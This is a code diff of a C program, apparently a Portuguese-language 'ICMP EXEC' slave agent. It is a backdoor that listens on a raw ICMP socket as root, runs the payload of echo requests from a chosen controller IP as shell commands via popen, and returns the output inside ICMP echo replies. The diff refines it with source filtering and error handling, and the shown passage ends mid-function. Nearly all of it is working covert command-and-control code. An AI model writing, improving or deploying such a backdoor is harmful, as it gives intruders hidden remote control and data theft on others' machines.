@@ -1,108 +1,133 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <netinet/ip_icmp.h>
-#include <netinet/ip.h>
 #include <string.h>
 #include <unistd.h>
+#include <errno.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <netinet/ip_icmp.h>
+#include <netinet/ip.h>
 
-// ICMP EXEC - ESCRAVO
-
-#define SIZ 1024
-
-struct sockaddr_in dst_addr , src_addr;
-struct icmphdr *icmp;
-struct iphdr *ip;
+#define BUFSIZE 1024
 
 unsigned short checksum(void *b, int len); 
-FILE *executa(char *cmd);
+FILE *openpipe(char *cmd);
 
 int main(int argc , char *argv[])
 {
-	int sock , bytes_enviados , bytes_recebidos , tamanho_addr = sizeof(struct sockaddr_in);
-    char pacote[SIZ] , *payload , buffer[SIZ];
+	int sock , bytesent , bytesrecv , packetsize;
+    char packet[BUFSIZE] , *payload , buffer[BUFSIZE];
     FILE *prog;
 
-    // Cria o socket 
+    struct in_addr myaddr , src_addr;
+    struct sockaddr_in dst_addr;
+    struct icmphdr *icmp;
+    struct iphdr *ip;
+
+    if(argc != 2)
+    {
+        printf("Use: %s [IP DE ORIGEM]\n", argv[0]);
+        return EXIT_SUCCESS;
+    }
+    else if(getuid() != 0)
+    {
+        fprintf(stderr , "[INFO] Permissão negada !\nO programa deve ser executado como root.\n");
+        return EXIT_FAILURE;
+    }
+
     sock = socket(AF_INET , SOCK_RAW , IPPROTO_ICMP);
     if(sock == -1)
     {
-        fprintf(stderr , "> [ERRO]: Erro ao criar socket.\n");
-        return 1;
+        perror("[ERRO] Socket");
+        return EXIT_FAILURE;
     }
 
-    printf("> ICMP EXEC - Escravo \n");
-    printf("> Iniciando...\n");
+    printf("(ICMP EXEC/Escravo <- %s)\n", argv[1]);
 
     while(1)
     {
-        // Aguardando comando
-        bytes_recebidos = read(sock , pacote , SIZ);
-        if(bytes_recebidos > 0)
-        {
-            ip = (struct iphdr *)pacote;
-            if(bytes_recebidos > sizeof(struct iphdr))
-            {
-                bytes_recebidos -= sizeof(struct iphdr);
-                icmp = (struct icmphdr *) (ip + 1);
-                if(bytes_recebidos > sizeof(struct icmphdr))
-                {
-                    bytes_recebidos -= sizeof(struct icmphdr);
-                    payload = (char *)(icmp + 1);
-                    payload[bytes_recebidos] = '\0';
-                    printf("> Payload: %s\n", payload);
-                }
+        printf("Aguardando por pacotes ICMP (localhost <- %s)...\n",argv[1]);
 
-                // Reutiliza os cabeçalhos 
-                icmp->type = ICMP_ECHOREPLY;
+        memset(buffer , 0 , sizeof(buffer));
+        memset(packet , 0 , sizeof(packet));
+        bytesrecv = bytesent = packetsize = 0;
+
+        bytesrecv = recv(sock , packet , BUFSIZE , 0);
+        if(bytesrecv > 0)
+        {
+            ip = (struct iphdr *)packet;
+            if(bytesrecv > sizeof(struct iphdr))
+            {
+                bytesrecv -= sizeof(struct iphdr);
+                icmp = (struct icmphdr *) (ip + 1);
+
+                // Reutilizando cabeçalho IP
                 dst_addr.sin_addr.s_addr = ip->saddr;
                 dst_addr.sin_family = AF_INET;
 
-                // Executa o comando
-                prog = executa(payload);
-                if(prog == NULL) continue;
+                src_addr.s_addr = inet_addr(argv[1]);
+                myaddr.s_addr = ip->daddr;
 
-                // Envia a saida do comando
-                while(fgets(buffer , SIZ , prog) != NULL)
+                if(bytesrecv > sizeof(struct icmphdr) && icmp->type == ICMP_ECHO &&
+                    src_addr.s_addr == dst_addr.sin_addr.s_addr)
                 {
-                    memcpy((char *) (icmp + 1), buffer, strlen(buffer));
-                    icmp->checksum = 0;
-                    icmp->checksum = checksum(icmp , sizeof(struct icmphdr));
+                    bytesrecv -= sizeof(struct icmphdr);
+                    payload = (char *)(icmp + 1);
+                    payload[bytesrecv] = '\0';
 
-                    int full_size = sizeof(struct icmphdr) + strlen(buffer); 
-                    bytes_enviados = sendto(sock , icmp , full_size , 0 , (struct sockaddr*)&dst_addr , tamanho_addr);
-                    if(bytes_enviados <= 0) printf("> O pacote não foi enviado");
+                    icmp->type = ICMP_ECHOREPLY;
+            
+                    printf("%s -> %s | Tamanho: %li | Comando: %s\n", argv[1],inet_ntoa(myaddr) , bytesrecv  , payload);
+
+                    prog = openpipe(payload);
+                    if(prog == NULL) continue;
                     
+                    // Enviando a saida do comando
+                    while(fgets(buffer , sizeof(buffer) , prog) != NULL)
+                    {
+                        memcpy((char *) (icmp + 1), buffer, strlen(buffer));
+                        packetsize = sizeof(struct icmphdr) + strlen(buffer);
+                        icmp->checksum = 0;
+                        icmp->checksum = checksum(icmp ,packetsize);
+ 
+                        bytesent = sendto(sock , icmp , packetsize , 0 , (struct sockaddr*)&dst_addr , sizeof(dst_addr));
+                        if(bytesent <= 0) perror("[ERRO] Sendto");
+                        
+                    }
+                    pclose(prog);
                 }
-
-                bytes_recebidos = 0;
-                bytes_enviados = 0;
             }
         }
+        else
+        {
+            perror("[ERRO] Recv");
+            break;
+        }
     }
-	return 0;
+    close(sock);
+	return EXIT_SUCCESS;
 }
 
-// Calcula o checksum do cabeçalho icmp
+// Calcula o checksum do cabeçalho ICMP
 unsigned short checksum(void *b, int len) 
-{    unsigned short *buf = b; 
-    unsigned int sum=0; 
+{    
+    unsigned short *buf = b; 
+    unsigned int sum = 0; 
     unsigned short result; 
   
-    for ( sum = 0; len > 1; len -= 2 ) 
-        sum += *buf++; 
-    if ( len == 1 ) 
-        sum += *(unsigned char*)buf; 
+    for ( sum = 0; len > 1; len -= 2 ) sum += *buf++; 
+    
+    if ( len == 1 ) sum += *(unsigned char*)buf; 
     sum = (sum >> 16) + (sum & 0xFFFF); 
     sum += (sum >> 16); 
-    result = ~sum; 
+    result = ~sum;
+
     return result; 
 }
 
-// Executa o comando
-FILE *executa(char *cmd)
+// Abre um pipe para leitura no comando executado em 'cmd'
+FILE *openpipe(char *cmd)
 {
     FILE *pipe = popen(cmd , "r");
     return pipe;
